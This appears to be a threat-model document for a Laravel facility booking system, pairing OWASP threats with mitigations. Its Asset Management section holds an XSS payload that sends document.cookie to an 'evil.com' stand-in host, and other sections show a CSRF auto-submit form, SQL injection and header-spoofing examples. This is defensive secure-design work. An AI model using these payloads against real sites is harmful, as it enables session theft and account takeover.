# 🔒 Security Threats & Mitigations

## Overview
This document identifies **two critical security threats** for each major module in the TARUMT Facility Booking System, along with comprehensive mitigation strategies aligned with OWASP Top 10 security standards.

---

## 🛡️ Audit Log Module

### Threat 1: SQL Injection Attacks
**Description**: Attackers could manipulate filter inputs to inject malicious SQL queries and access/modify unauthorized data.

**OWASP Reference**: A03:2021 – Injection

**Attack Vector**:
```php
// Vulnerable code example (NOT used in this system)
$action = $_GET['action'];
DB::select("SELECT * FROM audit_logs WHERE action = '$action'");
```

**Mitigation Strategy**:
✅ **Eloquent ORM with Parameter Binding**
```php
// Our secure implementation
AuditLog::where('action', request('action'))->get();

// Laravel automatically binds parameters
$query->where('action', $request->action);
```

**Additional Protections**:
- Input validation using Laravel's Request validation
- Type hinting in controller methods
- Eloquent query builder prevents raw SQL injection

---

### Threat 2: Unauthorized Access to Audit Logs
**Description**: Non-admin users or external attackers could access sensitive audit logs containing confidential system activity.

**OWASP Reference**: A01:2021 – Broken Access Control

**Attack Vector**:
- Direct URL access: `/admin/audit-logs`
- JWT token manipulation
- Session hijacking

**Mitigation Strategy**:
✅ **Multi-Layer Access Control**
```php
// Route middleware protection
Route::middleware(['auth', 'admin'])->group(function () {
    Route::get('/audit-logs', [AuditLogController::class, 'index']);
});

// IP Whitelist for admin routes
if (!in_array($request->ip(), config('security.admin_ips'))) {
    abort(403);
}
```

**Additional Protections**:
- Role-based access control (RBAC)
- Session timeout after inactivity
- IP whitelisting for admin panel
- Audit logging of all access attempts

---

## 📦 Asset Management Module

### Threat 1: Mass Assignment Vulnerability
**Description**: Attackers could manipulate HTTP request parameters to modify unintended model attributes (e.g., change asset ownership, modify prices).

**OWASP Reference**: A04:2021 – Insecure Design

**Attack Vector**:
```http
POST /admin/assets
{
    "name": "Projector",
    "is_admin": true,  // Attacker tries to escalate privileges
    "facility_id": 999  // Unauthorized facility access
}
```

**Mitigation Strategy**:
✅ **Fillable/Guarded Properties**
```php
// Asset Model
class Asset extends Model {
    protected $fillable = [
        'facility_id', 'name', 'type', 
        'serial_number', 'condition'
    ];
    
    protected $guarded = ['is_admin', 'created_by'];
}
```

**Additional Protections**:
- Form Request validation classes
- Server-side validation for all inputs
- Type casting in models (`$casts` property)

---

### Threat 2: Cross-Site Scripting (XSS)
**Description**: Malicious JavaScript injection through asset names/descriptions that executes when viewed by admins.

**OWASP Reference**: A03:2021 – Injection (XSS variant)

**Attack Vector**:
```html
<!-- Attacker creates asset -->
Name: <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- When admin views asset list -->
Asset Name: <script>/* Executes and steals session */</script>
```

**Mitigation Strategy**:
✅ **Automatic XSS Protection with Blade Templates**
```blade
{{-- Safe: Automatically escaped --}}
<td>{{ $asset->name }}</td>

{{-- Dangerous: Only use for trusted HTML --}}
<td>{!! $asset->name !!}</td>  <!-- NEVER use for user input -->
```

**Additional Protections**:
- Content Security Policy (CSP) headers
- HTML Purifier for rich text fields
- Input sanitization before storage
- Output encoding on display

---

## 📅 Booking System Module

### Threat 1: Cross-Site Request Forgery (CSRF)
**Description**: Attackers trick authenticated users into submitting malicious booking requests without their knowledge.

**OWASP Reference**: A01:2021 – Broken Access Control

**Attack Vector**:
```html
<!-- Attacker's malicious website -->
<img src="https://facility.tarumt.edu.my/bookings/delete/123" />

<!-- Or via form submission -->
<form action="https://facility.tarumt.edu.my/bookings/create" method="POST">
    <input type="hidden" name="facility_id" value="1" />
    <input type="hidden" name="date" value="2025-12-25" />
</form>
<script>document.forms[0].submit();</script>
```

**Mitigation Strategy**:
✅ **Laravel CSRF Token Protection**
```blade
{{-- All forms include CSRF token --}}
<form method="POST" action="{{ route('bookings.store') }}">
    @csrf
    <!-- Form fields -->
</form>
```

```php
// Middleware automatically validates
// app/Http/Kernel.php
protected $middlewareGroups = [
    'web' => [
        \App\Http\Middleware\VerifyCsrfToken::class,
    ],
];
```

**Additional Protections**:
- SameSite cookie attribute
- Double-submit cookie pattern
- Token rotation on sensitive actions

---

### Threat 2: Session Hijacking
**Description**: Attackers steal or predict session IDs to impersonate legitimate users and make unauthorized bookings.

**OWASP Reference**: A07:2021 – Identification and Authentication Failures

**Attack Vector**:
- Network sniffing (man-in-the-middle)
- XSS attacks stealing session cookies
- Session fixation attacks

**Mitigation Strategy**:
✅ **Secure Session Configuration**
```php
// config/session.php
return [
    'secure' => true,        // HTTPS only
    'http_only' => true,     // Not accessible via JavaScript
    'same_site' => 'strict', // CSRF protection
    'lifetime' => 120,       // 2 hour timeout
];
```

**Additional Protections**:
- Session regeneration after login
- IP address validation
- User-agent validation
- Strict HTTPS enforcement (HSTS headers)

---

## ⚙️ Admin Panel Module

### Threat 1: Privilege Escalation
**Description**: Regular users exploit vulnerabilities to gain admin privileges and access restricted functionality.

**OWASP Reference**: A01:2021 – Broken Access Control

**Attack Vector**:
```http
POST /api/users/update-role
{
    "user_id": 123,
    "role": "admin"  // Regular user tries to promote themselves
}
```

**Mitigation Strategy**:
✅ **Role-Based Authorization Gates**
```php
// Policy-based authorization
class UserPolicy {
    public function updateRole(User $user, User $targetUser) {
        return $user->role === 'admin' && 
               $user->id !== $targetUser->id;
    }
}

// Controller usage
$this->authorize('updateRole', $targetUser);
```

**Additional Protections**:
- Separate admin authentication guard
- Two-factor authentication for admins
- Admin action logging in audit trail
- Regular privilege review audits

---

### Threat 2: IP Spoofing / Whitelist Bypass
**Description**: Attackers spoof IP addresses to bypass IP whitelist restrictions and access admin panel.

**OWASP Reference**: A05:2021 – Security Misconfiguration

**Attack Vector**:
```http
GET /admin/dashboard HTTP/1.1
Host: facility.tarumt.edu.my
X-Forwarded-For: 127.0.0.1  // Spoofed header
```

**Mitigation Strategy**:
✅ **Robust IP Detection & Validation**
```php
// AdminIpWhitelist Middleware
public function handle($request, Closure $next) {
    $trustedIPs = config('security.admin_ips');
    
    // Use most reliable IP detection
    $ip = $request->ip(); // Laravel's trusted proxy-aware method
    
    // Log all admin access attempts
    Log::channel('security')->info('Admin access attempt', [
        'ip' => $ip,
        'user' => auth()->user()?->email,
        'allowed' => in_array($ip, $trustedIPs)
    ]);
    
    if (!in_array($ip, $trustedIPs)) {
        abort(403, 'Access denied from this IP address');
    }
    
    return $next($request);
}
```

**Additional Protections**:
- Configure trusted proxies properly
- Validate against multiple headers (X-Real-IP, X-Forwarded-For)
- VPN requirement for remote admin access
- Geographic IP restrictions
- Rate limiting per IP address

---

## 🎯 Summary Matrix

| Module | Threat 1 | Threat 2 | Primary Mitigation |
|--------|----------|----------|-------------------|
| **Audit Log** | SQL Injection | Unauthorized Access | Eloquent ORM, RBAC + IP Whitelist |
| **Asset Management** | Mass Assignment | XSS Attacks | `$fillable`, Blade Escaping |
| **Booking System** | CSRF | Session Hijacking | `@csrf` Token, Secure Sessions |
| **Admin Panel** | Privilege Escalation | IP Spoofing | Policy Gates, IP Validation |

---

## 📚 References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Laravel Security Best Practices](https://laravel.com/docs/10.x/security)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Last Updated**: December 19, 2025  
**Security Review Cycle**: Quarterly  
**Next Review**: March 2026
